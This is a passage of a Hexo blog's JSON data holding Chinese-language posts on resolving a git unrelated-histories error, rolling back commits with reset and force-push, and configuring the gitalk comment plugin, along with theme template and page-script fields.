操作之前执行下面一条命令来抑制本消息：\n提示：\n提示：  git config pull.rebase false  # 合并\n提示：  git config pull.rebase true   # 变基\n提示：  git config pull.ff only       # 仅快进\n提示：\n提示：您可以将 \"git config\" 替换为 \"git config --global\" 以便为所有仓库设置\n提示：缺省的配置项。您也可以在每次执行 pull 命令时添加 --rebase、--no-rebase，\n提示：或者 --ff-only 参数覆盖缺省设置。\n致命错误：需要指定如何调和偏离的分支。\n```\n\n说实话我没怎么看懂这个报错，不过给了提示，我就跟着这个提示进行操作。结果：\n\n```bash\nknight@knight:~/blog/lxp731.github.io$ git config pull.rebase false\nknight@knight:~/blog/lxp731.github.io$ git pull\n致命错误：拒绝合并无关的历史\n```\n\n然后没办法上网查找看到这样的解决办法：\n\nPS:记得把“main”修改为自己想pull下来的分支\n\n### 解决办法\n\n```bash\ngit pull origin main --allow-unrelated-histories \n```\n\nPS:记得把“main”修改为自己想pull下来的分支\n\n由此问题解决!!!","source":"_posts/git-merge-error.md","raw":"---\ntitle: Git 拒绝合并无关历史\ndate: 2023-03-26 22:46:29\ncategories: 探索\ntags:\n  - Git\n---\n\n### 问题描述\n\n可能是因为经常在两台电脑上开发的缘故吧，之间来回倒腾。在windows上开发了一些东西，又回到Ubuntu后，就应该是先进行git pull。没错，就应该是这样，然而在我进行git pull时，所有的进度都进行完成之后，出现了以下的报错。\n\n<!-- more -->\n\n```bash 折叠代码\n提示：您有偏离的分支，需要指定如何调和它们。您可以在执行下一次\n提示：pull 操作之前执行下面一条命令来抑制本消息：\n提示：\n提示：  git config pull.rebase false  # 合并\n提示：  git config pull.rebase true   # 变基\n提示：  git config pull.ff only       # 仅快进\n提示：\n提示：您可以将 \"git config\" 替换为 \"git config --global\" 以便为所有仓库设置\n提示：缺省的配置项。您也可以在每次执行 pull 命令时添加 --rebase、--no-rebase，\n提示：或者 --ff-only 参数覆盖缺省设置。\n致命错误：需要指定如何调和偏离的分支。\n```\n\n说实话我没怎么看懂这个报错，不过给了提示，我就跟着这个提示进行操作。结果：\n\n```bash\nknight@knight:~/blog/lxp731.github.io$ git config pull.rebase false\nknight@knight:~/blog/lxp731.github.io$ git pull\n致命错误：拒绝合并无关的历史\n```\n\n然后没办法上网查找看到这样的解决办法：\n\nPS:记得把“main”修改为自己想pull下来的分支\n\n### 解决办法\n\n```bash\ngit pull origin main --allow-unrelated-histories \n```\n\nPS:记得把“main”修改为自己想pull下来的分支\n\n由此问题解决!!!","slug":"git-merge-error","published":1,"updated":"2024-05-03T03:55:54.853Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fp005t7zj30wokd0nb","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>可能是因为经常在两台电脑上开发的缘故吧，之间来回倒腾。在windows上开发了一些东西，又回到Ubuntu后，就应该是先进行git pull。没错，就应该是这样，然而在我进行git pull时，所有的进度都进行完成之后，出现了以下的报错。</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">提示：您有偏离的分支，需要指定如何调和它们。您可以在执行下一次</span><br><span class=\"line\">提示：pull 操作之前执行下面一条命令来抑制本消息：</span><br><span class=\"line\">提示：</span><br><span class=\"line\">提示：  git config pull.rebase <span class=\"literal\">false</span>  <span class=\"comment\"># 合并</span></span><br><span class=\"line\">提示：  git config pull.rebase <span class=\"literal\">true</span>   <span class=\"comment\"># 变基</span></span><br><span class=\"line\">提示：  git config pull.ff only       <span class=\"comment\"># 仅快进</span></span><br><span class=\"line\">提示：</span><br><span class=\"line\">提示：您可以将 <span class=\"string\">&quot;git config&quot;</span> 替换为 <span class=\"string\">&quot;git config --global&quot;</span> 以便为所有仓库设置</span><br><span class=\"line\">提示：缺省的配置项。您也可以在每次执行 pull 命令时添加 --rebase、--no-rebase，</span><br><span class=\"line\">提示：或者 --ff-only 参数覆盖缺省设置。</span><br><span class=\"line\">致命错误：需要指定如何调和偏离的分支。</span><br></pre></td></tr></table></figure>\n\n<p>说实话我没怎么看懂这个报错，不过给了提示，我就跟着这个提示进行操作。结果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/blog/lxp731.github.io$ git config pull.rebase <span class=\"literal\">false</span></span><br><span class=\"line\">knight@knight:~/blog/lxp731.github.io$ git pull</span><br><span class=\"line\">致命错误：拒绝合并无关的历史</span><br></pre></td></tr></table></figure>\n\n<p>然后没办法上网查找看到这样的解决办法：</p>\n<p>PS:记得把“main”修改为自己想pull下来的分支</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git pull origin main --allow-unrelated-histories </span><br></pre></td></tr></table></figure>\n\n<p>PS:记得把“main”修改为自己想pull下来的分支</p>\n<p>由此问题解决!!!</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>可能是因为经常在两台电脑上开发的缘故吧，之间来回倒腾。在windows上开发了一些东西，又回到Ubuntu后，就应该是先进行git pull。没错，就应该是这样，然而在我进行git pull时，所有的进度都进行完成之后，出现了以下的报错。</p>","more":"<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">提示：您有偏离的分支，需要指定如何调和它们。您可以在执行下一次</span><br><span class=\"line\">提示：pull 操作之前执行下面一条命令来抑制本消息：</span><br><span class=\"line\">提示：</span><br><span class=\"line\">提示：  git config pull.rebase <span class=\"literal\">false</span>  <span class=\"comment\"># 合并</span></span><br><span class=\"line\">提示：  git config pull.rebase <span class=\"literal\">true</span>   <span class=\"comment\"># 变基</span></span><br><span class=\"line\">提示：  git config pull.ff only       <span class=\"comment\"># 仅快进</span></span><br><span class=\"line\">提示：</span><br><span class=\"line\">提示：您可以将 <span class=\"string\">&quot;git config&quot;</span> 替换为 <span class=\"string\">&quot;git config --global&quot;</span> 以便为所有仓库设置</span><br><span class=\"line\">提示：缺省的配置项。您也可以在每次执行 pull 命令时添加 --rebase、--no-rebase，</span><br><span class=\"line\">提示：或者 --ff-only 参数覆盖缺省设置。</span><br><span class=\"line\">致命错误：需要指定如何调和偏离的分支。</span><br></pre></td></tr></table></figure>\n\n<p>说实话我没怎么看懂这个报错，不过给了提示，我就跟着这个提示进行操作。结果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/blog/lxp731.github.io$ git config pull.rebase <span class=\"literal\">false</span></span><br><span class=\"line\">knight@knight:~/blog/lxp731.github.io$ git pull</span><br><span class=\"line\">致命错误：拒绝合并无关的历史</span><br></pre></td></tr></table></figure>\n\n<p>然后没办法上网查找看到这样的解决办法：</p>\n<p>PS:记得把“main”修改为自己想pull下来的分支</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git pull origin main --allow-unrelated-histories </span><br></pre></td></tr></table></figure>\n\n<p>PS:记得把“main”修改为自己想pull下来的分支</p>\n<p>由此问题解决!!!</p>"},{"title":"Git进阶操作--回滚代码","date":"2023-03-24T09:00:00.000Z","_content":"\n### 问题描述\n\n可能是我之前的操作都太简单了，几乎都是一遍提交，从来没有遇到过回滚的情况，也没有进行深入的研究。直到今天，我把一次修改提交之后，发现博客网站全部乱码，倒也不是乱码，只是没有任何秩序可言，我当时只感脑壳一白。我是谁？我在哪？我在干什么？\n\n我真的不知道是做了什么修改，可能是因为修改时几次误操作，而且操作过那么多文件，要想一个一个去排查，几乎是不可能的。\n\n我想这可能就是Git之所以能够封神的原因之一吧，他支持项目的回滚。可以回到任何一个提交的修改点，就像是每次提交都像是给虚拟机拍了一个快照。\n\n那么进入今天的正题吧！！！\n\n<!-- more -->\n\n### 解决办法\n\n1. 首先在网站上把要恢复的Git-sha码复制下来\n\n![sha码](./git-rollback/1.png)\n\n2. 接下来回到终端执行\n\n```bash\ngit reset --hard commit_sha\n```\n\n把“commit_sha”换成刚刚复制下来的sha码，有时候在终端粘贴的时候会在末尾带一个\"~\"，要记得删掉。\n\n3. 最后强制提交更改\n\n```bash\ngit push origin HEAD --force\n```\n执行完项目就完成回滚了，学会这一招儿，你就可以尽情造作了，玩坏了就回滚，so easy!!!","source":"_posts/git-rollback.md","raw":"---\ntitle: Git进阶操作--回滚代码\ndate: 2023-3-24 17:00:00\ncategories: 探索\ntags: \n  - Git\n---\n\n### 问题描述\n\n可能是我之前的操作都太简单了，几乎都是一遍提交，从来没有遇到过回滚的情况，也没有进行深入的研究。直到今天，我把一次修改提交之后，发现博客网站全部乱码，倒也不是乱码，只是没有任何秩序可言，我当时只感脑壳一白。我是谁？我在哪？我在干什么？\n\n我真的不知道是做了什么修改，可能是因为修改时几次误操作，而且操作过那么多文件，要想一个一个去排查，几乎是不可能的。\n\n我想这可能就是Git之所以能够封神的原因之一吧，他支持项目的回滚。可以回到任何一个提交的修改点，就像是每次提交都像是给虚拟机拍了一个快照。\n\n那么进入今天的正题吧！！！\n\n<!-- more -->\n\n### 解决办法\n\n1. 首先在网站上把要恢复的Git-sha码复制下来\n\n![sha码](./git-rollback/1.png)\n\n2. 接下来回到终端执行\n\n```bash\ngit reset --hard commit_sha\n```\n\n把“commit_sha”换成刚刚复制下来的sha码，有时候在终端粘贴的时候会在末尾带一个\"~\"，要记得删掉。\n\n3. 最后强制提交更改\n\n```bash\ngit push origin HEAD --force\n```\n执行完项目就完成回滚了，学会这一招儿，你就可以尽情造作了，玩坏了就回滚，so easy!!!","slug":"git-rollback","published":1,"updated":"2024-05-03T03:55:54.853Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fq005w7zj308ghbrzt","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>可能是我之前的操作都太简单了，几乎都是一遍提交，从来没有遇到过回滚的情况，也没有进行深入的研究。直到今天，我把一次修改提交之后，发现博客网站全部乱码，倒也不是乱码，只是没有任何秩序可言，我当时只感脑壳一白。我是谁？我在哪？我在干什么？</p>\n<p>我真的不知道是做了什么修改，可能是因为修改时几次误操作，而且操作过那么多文件，要想一个一个去排查，几乎是不可能的。</p>\n<p>我想这可能就是Git之所以能够封神的原因之一吧，他支持项目的回滚。可以回到任何一个提交的修改点，就像是每次提交都像是给虚拟机拍了一个快照。</p>\n<p>那么进入今天的正题吧！！！</p>\n<span id=\"more\"></span>\n\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><ol>\n<li>首先在网站上把要恢复的Git-sha码复制下来</li>\n</ol>\n<p><img src=\"/2023/03/24/git-rollback/1.png\" alt=\"sha码\"></p>\n<ol start=\"2\">\n<li>接下来回到终端执行</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git reset --hard commit_sha</span><br></pre></td></tr></table></figure>\n\n<p>把“commit_sha”换成刚刚复制下来的sha码，有时候在终端粘贴的时候会在末尾带一个”~”，要记得删掉。</p>\n<ol start=\"3\">\n<li>最后强制提交更改</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin HEAD --force</span><br></pre></td></tr></table></figure>\n<p>执行完项目就完成回滚了，学会这一招儿，你就可以尽情造作了，玩坏了就回滚，so easy!!!</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>可能是我之前的操作都太简单了，几乎都是一遍提交，从来没有遇到过回滚的情况，也没有进行深入的研究。直到今天，我把一次修改提交之后，发现博客网站全部乱码，倒也不是乱码，只是没有任何秩序可言，我当时只感脑壳一白。我是谁？我在哪？我在干什么？</p>\n<p>我真的不知道是做了什么修改，可能是因为修改时几次误操作，而且操作过那么多文件，要想一个一个去排查，几乎是不可能的。</p>\n<p>我想这可能就是Git之所以能够封神的原因之一吧，他支持项目的回滚。可以回到任何一个提交的修改点，就像是每次提交都像是给虚拟机拍了一个快照。</p>\n<p>那么进入今天的正题吧！！！</p>","more":"<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><ol>\n<li>首先在网站上把要恢复的Git-sha码复制下来</li>\n</ol>\n<p><img src=\"/2023/03/24/git-rollback/1.png\" alt=\"sha码\"></p>\n<ol start=\"2\">\n<li>接下来回到终端执行</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git reset --hard commit_sha</span><br></pre></td></tr></table></figure>\n\n<p>把“commit_sha”换成刚刚复制下来的sha码，有时候在终端粘贴的时候会在末尾带一个”~”，要记得删掉。</p>\n<ol start=\"3\">\n<li>最后强制提交更改</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin HEAD --force</span><br></pre></td></tr></table></figure>\n<p>执行完项目就完成回滚了，学会这一招儿，你就可以尽情造作了，玩坏了就回滚，so easy!!!</p>"},{"title":"博客评论系统之gitalk","date":"2023-07-14T12:54:56.000Z","_content":"\n### 背景介绍\n\n自己一味的输出，倘若收不到别人的反馈，自己也是不会进步的，博客的质量也就只会在当前的水平停止不前，在这样的影响下，我决心要给博客打造一个评论系统，于是我花了点时间深入研究了博客的评论的系统搭建。\n\n最初，我选择的是github的gitalk。\n\n### 环境说明\n\n我的博客基于hexo，使用的是next主题，这个主题安装之后，在主题的配置文件中，默认存在几个关于评论的系统板块，我们只要针对gitalk这个板块编辑就OK。\n\n<!-- more -->\n\n### 创建仓库\n\n1. 直接在github首页创建一个仓库，用来存储博客的评论，相当于一个数据库的作用。\n\n* 首先填写一个仓库名字，下面报红是因为我已经创建过一个了。\n* 仓库描述的话选填，可写可不写。\n* 选择为public。\n* 最后点击创建仓库。\n\n![创建仓库](./gitalk-comment/1.png)\n\n2. 除了建仓库，还需要注册一个应用。[官方注册地址](https://github.com/settings/applications/new)。\n\n* Application name填写的还是一个应用程序的名字，这里我填写的和仓库的名字保持一样了，你们按照喜好来就OK。\n* Homepage URL然后填写的是你的网站域名。\n* Application description接下来又是一个描述类的信息，选填。\n* Authorization callback URL这里同样填写你网站的域名。\n* 最后注册应用程序等待完成就好。\n\n![创建应用程序](./gitalk-comment/2.png)\n\n3. 创建完成后，默认会进入应用程序，接下来要完成一个秘钥的生成。\n\n* Client ID默认会存在。这个待会还会用到。\n* 默认是不存在密钥的，要点击生成秘钥，生成之后要立刻复制下来，因为保存或者离开页面就变成图例这样了。这个待会还会用到。\n* logo可以自己设计一个，感觉蛮不错的。\n* 都设置完之后点击最下面的Update Application。\n\n![设置应用程序](./gitalk-comment/3.png)\n\n后期如果需要对应用程序进行一些修改，可以依次到github头像-->setting-->Developer Settings-->OAuth Apps进行修改。\n\n### 修改配置文件\n\n修改配置文件的部分，进入博客主目录，`vim themes/next/_config.yml`\n\n1. 首先需要把`active`的值，改为gitalk\n\n```bash 折叠代码\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: gitalk\n  # Setting `true` means remembering the comment system selected by the visitor.\n  storage: true\n  # Lazyload all comment systems.\n  lazyload: false\n  # Modify texts or order for any naves, here are some examples.\n  nav:\n    #disqus:\n    #  text: Load Disqus\n    #  order: -1\n    #gitalk:\n    #  order: -2\n```\n\n2. 然后往下滑，找到gitalk的模块。\n\n  * enable的值设置为true，表示启用。\n  * github_id表示你的github的账号。\n  * repo，填写用来存储评论的仓库。\n  * client_id之前创建的ID。\n  * client_secret之前创建好的口令。\n  * admin_user这个是管理员的账户，也就是你自己的github账号。\n  * distraction_free_mode默认就好。\n  * proxy代理值，默认就好。\n  * language语言类型，别的地方我不管，在我这里必须讲中文。\n\n```bash 折叠代码\ngitalk:\n  enable: true\n  github_id: lxp731 # GitHub repo owner\n  repo: hexo-comment # Repository name to store issues\n  client_id: b771bc******0002c29 # GitHub Application Client ID\n  client_secret: e87e6******531007231*******5ab3c131d3aa1 # GitHub Application Client Secret\n  admin_user: lxp731 # GitHub repo owner and collaborators, only these guys can initialize gitHub issues\n  distraction_free_mode: true # Facebook-like distraction free mode\n  # When the official proxy is not available, you can change it to your own proxy address\n  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token # This is official proxy address\n  # Gitalk's display language depends on user's browser or system environment\n  # If you want everyone visiting your site to see a uniform language, you can set a force language value\n  # Available values: en | es-ES | fr | ru | zh-CN | zh-TW\n  language: zh-CN\n  ```","source":"_posts/gitalk-comment.md","raw":"---\ntitle: 博客评论系统之gitalk\ndate: 2023-07-14 20:54:56\ncategories: 博客搭建\ntags:\n  - 博客评论\n---\n\n### 背景介绍\n\n自己一味的输出，倘若收不到别人的反馈，自己也是不会进步的，博客的质量也就只会在当前的水平停止不前，在这样的影响下，我决心要给博客打造一个评论系统，于是我花了点时间深入研究了博客的评论的系统搭建。\n\n最初，我选择的是github的gitalk。\n\n### 环境说明\n\n我的博客基于hexo，使用的是next主题，这个主题安装之后，在主题的配置文件中，默认存在几个关于评论的系统板块，我们只要针对gitalk这个板块编辑就OK。\n\n<!-- more -->\n\n### 创建仓库\n\n1. 直接在github首页创建一个仓库，用来存储博客的评论，相当于一个数据库的作用。\n\n* 首先填写一个仓库名字，下面报红是因为我已经创建过一个了。\n* 仓库描述的话选填，可写可不写。\n* 选择为public。\n* 最后点击创建仓库。\n\n![创建仓库](./gitalk-comment/1.png)\n\n2. 除了建仓库，还需要注册一个应用。[官方注册地址](https://github.com/settings/applications/new)。\n\n* Application name填写的还是一个应用程序的名字，这里我填写的和仓库的名字保持一样了，你们按照喜好来就OK。\n* Homepage URL然后填写的是你的网站域名。\n* Application description接下来又是一个描述类的信息，选填。\n* Authorization callback URL这里同样填写你网站的域名。\n* 最后注册应用程序等待完成就好。\n\n![创建应用程序](./gitalk-comment/2.png)\n\n3. 创建完成后，默认会进入应用程序，接下来要完成一个秘钥的生成。\n\n* Client ID默认会存在。这个待会还会用到。\n* 默认是不存在密钥的，要点击生成秘钥，生成之后要立刻复制下来，因为保存或者离开页面就变成图例这样了。这个待会还会用到。\n* logo可以自己设计一个，感觉蛮不错的。\n* 都设置完之后点击最下面的Update Application。\n\n![设置应用程序](./gitalk-comment/3.png)\n\n后期如果需要对应用程序进行一些修改，可以依次到github头像-->setting-->Developer Settings-->OAuth Apps进行修改。\n\n### 修改配置文件\n\n修改配置文件的部分，进入博客主目录，`vim themes/next/_config.yml`\n\n1. 首先需要把`active`的值，改为gitalk\n\n```bash 折叠代码\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: gitalk\n  # Setting `true` means remembering the comment system selected by the visitor.\n  storage: true\n  # Lazyload all comment systems.\n  lazyload: false\n  # Modify texts or order for any naves, here are some examples.\n  nav:\n    #disqus:\n    #  text: Load Disqus\n    #  order: -1\n    #gitalk:\n    #  order: -2\n```\n\n2. 然后往下滑，找到gitalk的模块。\n\n  * enable的值设置为true，表示启用。\n  * github_id表示你的github的账号。\n  * repo，填写用来存储评论的仓库。\n  * client_id之前创建的ID。\n  * client_secret之前创建好的口令。\n  * admin_user这个是管理员的账户，也就是你自己的github账号。\n  * distraction_free_mode默认就好。\n  * proxy代理值，默认就好。\n  * language语言类型，别的地方我不管，在我这里必须讲中文。\n\n```bash 折叠代码\ngitalk:\n  enable: true\n  github_id: lxp731 # GitHub repo owner\n  repo: hexo-comment # Repository name to store issues\n  client_id: b771bc******0002c29 # GitHub Application Client ID\n  client_secret: e87e6******531007231*******5ab3c131d3aa1 # GitHub Application Client Secret\n  admin_user: lxp731 # GitHub repo owner and collaborators, only these guys can initialize gitHub issues\n  distraction_free_mode: true # Facebook-like distraction free mode\n  # When the official proxy is not available, you can change it to your own proxy address\n  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token # This is official proxy address\n  # Gitalk's display language depends on user's browser or system environment\n  # If you want everyone visiting your site to see a uniform language, you can set a force language value\n  # Available values: en | es-ES | fr | ru | zh-CN | zh-TW\n  language: zh-CN\n  ```","slug":"gitalk-comment","published":1,"updated":"2024-05-03T03:55:54.853Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fr00607zj3b8uh8n1e","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script 